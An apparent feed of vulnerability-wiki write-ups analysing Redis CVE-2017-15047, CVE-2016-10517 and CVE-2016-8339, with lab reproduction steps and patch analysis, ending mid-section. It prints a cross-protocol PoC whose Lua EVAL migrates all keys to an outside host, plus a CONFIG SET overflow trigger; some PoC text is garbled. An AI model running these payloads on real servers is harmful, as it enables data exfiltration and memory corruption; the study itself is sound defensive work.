<strong>node-6379.conf</strong>虽然此配置的名字叫”集群配置文件”，但是此配置文件不能人工编辑，它是集群节点自动维护的文件，主要用于记录集群中有哪些节点、他们的状态以及一些持久化参数等，方便在重启时恢复这些状态。通常是在收到请求之后这个文件就会被更新。</p><p>​        复现时已经触发一次，<strong>node-6379.conf</strong>里面记录上一次连接时的一些信息。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        再次尝试利用远程命令设置slot值，看能不能远程触发边界索引溢出漏洞，当使用远程cluster命令时，redis-server调用clusterCommand函数。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/18.png"></p><p>​        执行cluster setslot命令时，执行下面内容：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/19.png"></p><p>​    会被getSlotOrReply函数检查提交的slot值与CLUSTER_SLOTS进行比较，若大于16384，则报错。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/10.png"></p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        漏洞产生原因是在集群模式部署下，使用cluster相关命令时，对slot值没有做边界校验，导致直接索引migrating_slots_to和migrating_slots_from数组并赋值，而migrating_slots_to和migrating_slots_from数组大小由CLUSTER_SLOTS(16384)确定。一旦slot值大于16384，则会导致数组边界溢出。</p><p>​        补丁是在/redis/src/cluster.c的clusterLoadConfig函数给migrating_slots_to和migrating_slots_from进行索引后赋值的地方进行了slot值与CLUSTER_SLOTS大小的判断，避免数组越界。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/11.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        尝试使用cluster setslot命令，触发漏洞，redis-server返回ERR信息。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/9.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/redis/redis/issues/4278">https://github.com/redis/redis/issues/4278</a></li><li><a href="https://security.gentoo.org/glsa/202008-17">https://security.gentoo.org/glsa/202008-17</a></li><li><a href="https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad">https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad</a></li><li><a href="https://github.com/natoscott/redis/commit/0ba2932298e3e432f32441ebc5d95a86158d706c">https://github.com/natoscott/redis/commit/0ba2932298e3e432f32441ebc5d95a86158d706c</a></li><li><a href="http://www.redis.cn/topics/cluster-tutorial.htm">http://www.redis.cn/topics/cluster-tutorial.htm</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-10517_Redis跨协议漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:49:21.000Z</published>
    <updated>2021-07-06T08:52:18.276Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis跨站脚本漏洞</li><li>漏洞编号：CVE-2016-10517</li><li>漏洞类型：跨协议脚本</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：7.4】</li><li>漏洞危害等级：中危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 3.2.7之前的版本中的networking.c文件存在跨站脚本漏洞。远程攻击者可利用该漏洞在浏览器中执行任意的脚本代码。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        攻击者可以远程访问redis-server</p><p>​        1.可以从浏览器发起特定的 HTTP 请求</p><p>​        2.可以从开发者的机器访问到 Redis 服务器</p><h3 id="漏洞影响。"><a href="#漏洞影响。" class="headerlink" title="漏洞影响。"></a>漏洞影响。</h3><p>​        Redis up to 3.2.7</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50">https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP/HTTP</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><p>在环境共享服务器中获取到环境源码\安装包，地址为:\\10.251.0.11\R-Redis\redis-3.2.7-unpacth.tar.zip文件，解压编译即可。</p><p>因为Redis对全版本进行了修复，若直接用redis-3.2.7源码编译，发送poc后，redis-server会提示该漏洞利用的提示：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/3.png"></p><p>并且发送的TCP连接会直接中断，如果存在漏洞redis-server会回复err不会直接断连接。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/11.png"></p><p>所以，先对redis-3.2.7源码进行去补丁操作。</p><p>补丁增加了一个判断函数 securityWarningCommand，将此函数的声明和调用在src/server.h、src/networking.c和src/server.c中删除。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/4.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/5.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        利用brup直接向靶机发送poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">post / HTTP/1.1</span><br><span class="line">Host: localhost: 6379</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintos; Intel Mac oS 10.12; rv: 50.0)</span><br><span class="line">Gecko/20100101 Firefox/50.0</span><br><span class="line">Accept:*/*</span><br><span class="line">Accept-Language: en-0s, en;g=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">referer: http: //localhost: 8000/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Content-Length: 10196</span><br><span class="line">origin: http: //localhost: 8000</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">EVAL &#x27;for k, v in pairs(redis. call(&quot;KEYS&quot;, &quot;*&quot;) do 4 redis.pcall(&quot;MIGRATE&quot;,&quot;whatsinm.com&quot;11111 5 v0,200)end&#x27;0</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/9.png"></p><p>​        未打补丁的redis-server则会响应，并保持连接。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/10.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/12.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​    Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        Redis 在解析命令的时候，会把每行文本当做输入。如果输入不能匹配上特定的命令，则丢弃输入。这意味着，如果我们用 HTTP 协议请求 Redis，那么 Redis 会跳过不认识的各种报头，执行请求体中的命令。举个例子，下面的 HTTP 请求中，只有最后的 EVAL 会被解析成合法的命令并执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">post / HTTP/1.1</span><br><span class="line">Host: localhost: 6379</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintos; Intel Mac oS 10.12; rv: 50.0)</span><br><span class="line">Gecko/20100101 Firefox/50.0</span><br><span class="line">Accept:*/*</span><br><span class="line">Accept-Language: en-0s, en;g=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">referer: http: //localhost: 8000/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Content-Length: 10196</span><br><span class="line">origin: http: //localhost: 8000</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">EVAL &#x27;for k, v in pairs(redis. call(&quot;KEYS&quot;, &quot;*&quot;) do 4 redis.pcall(&quot;MIGRATE&quot;,&quot;whatsinm.com&quot;11111 5 v0,200)end&#x27;0</span><br></pre></td></tr></table></figure><p>​        初看好像不算什么问题，毕竟攻击者都能直接请求 Redis 了，没必要用 HTTP 协议掩饰攻击行为。不过漏洞的发掘者想得更加深入。在他的 POC 中，构造了一个 HTML 页面，利用 AJAX 去请求 6379 端口。</p><p>​        一般来说，Redis 是不会暴露在公网里的，但是有可能跟开发者的机器在同一个内网中。假设开发者的浏览器发起了 AJAX 请求，便能绕过外网的限制，直接访问内网的 Redis。即使 Redis 不在 localhost 上，通过扫描（或者社工出具体的服务器地址）也有可能嗅探到内网中的 Redis 实例。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        在src/server.c中，声明全局数组redisCommandTable，存放redis中所有命令名称，由于不包括POST和host等一些HTTP定义的头部，导致无法判断出HTTP协议，攻击者将真实的redis命令写入HTTP协议的body中，redis没有直接拒绝连接而是继续搜索到body部分，成功执行命令。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/13.png"></p><p>每个列表由以下字段组成：</p><ul><li><p>name：表示命令名称的字符串。</p></li><li><p>function：指向实现命令的 C 函数的指针。</p></li><li><p>arity： 参数数，可以使用 -N 表示&gt;= N</p></li><li><p>sflags：命令标志为字符串。有关标志表，请参阅下文。</p></li><li><p>flags： 标志作为字掩码。由 Redis 使用”sflags”字段计算。</p></li><li><p>get_keys_proc：从命令获取键参数的可选函数。</p></li><li><p>这仅在以下三个字段不足以指定哪些参数是键。</p></li><li><p>first_key_index： 第一个参数是关键</p></li><li><p>last_key_index： 最后一个论点是关键</p></li><li><p>key_step：步骤获取从第一个到最后一个参数的所有键。</p></li><li><p>microseconds：此命令的总执行时间微秒。</p></li><li><p>calls：此命令的调用总数。</p></li><li><p>flags、 microseconds、calls字段由 Redis 计算，应始终设置为零。</p><p>​    命令标志使用字符串表示，其中每个字符都表示一个标志。稍后，populateCommandTable 函数将处理使用此字符填充真正的”flags”字段。</p></li></ul><p>这是标志的含义：</p><ul><li>w： 写入命令 （可以修改键空间）。</li><li>r： 读取命令（永远不会修改密钥空间）。</li><li>m： 一旦调用， 可能会增加内存使用量。如果内存不足，请不允许。</li><li>a： 管理命令，如保存或关闭。</li><li>p： Pub/子相关命令。</li><li>f： 强制复制此命令， 无论服务器。</li><li>s： 脚本中不允许使用命令。</li><li>R：随机命令。命令不是确定性的，也就是说，同一个命令具有相同的参数，具有相同的键空间，可能有不同的结果。例如，SPOP 和 RANDOMKEY 是两个随机命令。</li><li>S： 排序命令输出数组，如果从脚本调用，使输出是确定性的。</li><li>l：在加载数据库时允许命令。</li><li>t： 当从属有陈旧数据但不允许使用时，允许命令服务器此数据。在这种情况下，通常不接受任何命令但只是几个。</li><li>M： 不要在监视器上自动传播命令。</li><li>k： 对此命令执行隐式请求，因此该命令将如果插槽标记为”导入”，则接受群集模式。</li><li>F： 快速命令： O（1） 或 O（log（N）） 命令，不应延迟只要内核调度程序给我们时间，它的执行就行。注意，可能触发 DEL 作为副作用的命令（如 SET）不是快速命令。</li></ul><p>populateCommandTable函数对提交的命令进行flags的设置：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/15.png"></p><p>processCommand函数对提交的命令的flags进行判断是否为redisCommandTable中合法的命令，若不是则输出unknown command。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/14.png"></p><h4 id="漏洞触发过程"><a href="#漏洞触发过程" class="headerlink" title="漏洞触发过程"></a>漏洞触发过程</h4><p>​        在src/server.c中，声明全局数组redisCommandTable，存放redis中所有命令名称，由于不包括POST和host等一些HTTP定义的头部，导致无法判断出HTTP协议，攻击者将真实的redis命令写入HTTP协议的body中，redis没有直接拒绝连接，而是在processCommcand函数中一直搜索，遇到不在redisCommandTable中合法的命令，则输出unknown command。否则继续搜索到body部分，最后成功执行命令。</p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/4.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/5.png"></p><p>先分析 Redis 该补丁的工作原理：</p><p>​        作为 HTTP/1.1 规范，请求报头中应该有 Host 报头。如果没有，服务器会返回 400 错误码。这意味着，浏览器自己发送的 AJAX 请求中必然会带上 Host 报头。将Host和POST放进redisCommandTable数组中，当以后遇到这两个关键词，直接报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.</span><br></pre></td></tr></table></figure><p>​        可以尝试用 setRequestHeader 去自定义请求报头。</p><p>​        浏览器也知道这一点。如果用了 setRequestHeader，浏览器会先发送一个 OPTIONS 请求，附上 Access-Control-Request-Headers 报头，待目标服务器明断。只有服务器许可之后，才会进一步发送定制的 AJAX 请求。在这个场景里， Redis 自然什么都不会回复。</p><p>​        总而言之，没有什么办法，可以发送不带 Host 报头的 AJAX 请求。意味着只要 Host 被拉黑，所有的 AJAX 请求也被拉黑了。</p><p>对于没打该补丁的版本，该漏洞会有多大的影响？</p><p>​        漏洞依赖的第二点（可以从开发者的机器访问到 Redis 服务器），一般情况下难以满足。毕竟大多数时候，办公区网络和机房网络不在同一个网段里，而且还是互相隔离的。如果不是定点攻击，很难击中目标服务器。</p><p>​        漏洞依赖的第一点（可以从浏览器发起特定的 HTTP 请求），在很大程度上受浏览器的限制。对于那些想利用 AJAX 的攻击者，浏览器可是见得多了。不要忘记同源策略。即使黑客可以去请求特定的 Redis 服务器，受同源策略的影响，浏览器也不会返回响应的结果。意味着，攻击者可以向 Redis 发送命令，但是他们无法知道攻击是否成功。无法评估攻击的效果，通常会令漏洞的价值大打折扣。</p><p>​        当然如果能结合同源策略绕过，确实可以拿到具体的响应。但是这么一来利用空间就更窄了。</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>用HTTP协议伪装redis命令，在POST方法中的body部分添加redis命令。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/10.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50">https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50</a></li><li><a href="https://gist.githubusercontent.com/lamby/01ef8eaa7066282d0a5611a500ad4203/raw">https://gist.githubusercontent.com/lamby/01ef8eaa7066282d0a5611a500ad4203/raw</a></li><li><a href="https://segmentfault.com/a/1190000008237858">https://segmentfault.com/a/1190000008237858</a></li><li><a href="https://github.com/dxa4481/whatsinmyredis">https://github.com/dxa4481/whatsinmyredis</a></li><li><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-8339_Redis缓冲区溢出漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:36:40.000Z</published>
    <updated>2021-07-06T08:44:05.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis缓冲区溢出漏洞</li><li>漏洞编号：CVE-2016-8339</li><li>漏洞类型：缓冲区溢出</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：9.8】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        当发送精心制作的命令时，Redis 3.2.x中3.2.4之前的缓冲区溢出会导致任意代码执行。在Redis数据结构存储的CONFIG SET命令期间，对client-output-buffer-limit选项的处理中存在一个越界写入漏洞。精心设计的CONFIG SET命令导致越界写入，可能导致代码执行。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>1、攻击者可以访问到redis-server，redis-server配置外网可访问</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/9.png"></p><p>2、redis-server配置弱密码或空密码</p><p>3、redis-server取消保护模式</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10.png"></p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Redis:3.2.0</p><p>Redis:3.2.1</p><p>Redis:3.2.2</p><p>Redis:3.2.3</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977">https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><p>​        在环境共享服务器中获取到环境源码\安装包，地址为:\\10.251.0.11\R-Redis\redis-3.2.3.tar.zip文件，解压编译即可。</p><p>​        启动前先更改配置文件redis.conf，配置外网可访问，取消保护模式。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/9.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        攻击机发送config set命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.251.0.36 CONFIG SET client-output-buffer-limit &quot;master 3735928559 3405691582 373529054&quot;</span><br></pre></td></tr></table></figure><p>​        class字段设置为master。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        redis-server返回ok，虽然redis-server并没有崩溃，但是越界写入已经成功。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/14.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td 